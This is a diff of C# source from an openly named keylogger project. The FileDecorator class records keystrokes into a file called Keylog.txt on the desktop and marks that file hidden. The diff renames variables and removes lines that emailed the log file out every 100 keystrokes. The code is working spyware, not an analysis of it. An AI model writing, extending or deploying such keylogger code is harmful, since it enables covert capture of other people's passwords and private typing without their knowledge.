@@ -1,42 +1,38 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.IO;
-using System.Text;
 
 namespace KeyLogger
 {
     class FileDecorator
     {
-        string folder;
-        string file;
+        string folderPath;
+        string filePath;
+        string fileName = "Keylog.txt";
 
         public void CreateFile()
         {
-            folder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+            folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
             
-            if (!Directory.Exists(folder))
+            if (!Directory.Exists(folderPath))
             {
-                Directory.CreateDirectory(folder);
+                Directory.CreateDirectory(folderPath);
             }
 
-            file = folder + @"\keylog.txt";
+            filePath = folderPath + @"\" + fileName;
 
-            if (!File.Exists(file))
+            if (!File.Exists(filePath))
             {
-                using (StreamWriter sw = File.CreateText(file)) { }
+                using (StreamWriter sw = File.CreateText(filePath)) { }
             }
 
-            File.SetAttributes(file, File.GetAttributes(file) | FileAttributes.Hidden);
+            File.SetAttributes(filePath, File.GetAttributes(filePath) | FileAttributes.Hidden);
         }
 
         public string WriteFile()
         {
             int keySt = default;
-            int numberOfKeyStroke = default;
 
-            EmailSender emailSender = new EmailSender();
-
-            using (StreamWriter sw = File.AppendText(file))
+            using (StreamWriter sw = File.AppendText(filePath))
             {
                 for (int keyNumber = 32; keyNumber < 127; keyNumber++)
                 {
@@ -45,16 +41,10 @@ namespace KeyLogger
                     if (keySt == short.MinValue + 1)
                     {
                         sw.Write((char)keyNumber);
-                        numberOfKeyStroke++;
-
-                        if (numberOfKeyStroke % 100 == 0)
-                        {
-                            emailSender.SendMessage(file);
-                        }
                     }
                 }
 
-                return file;
+                return filePath;
             }
         }
     }
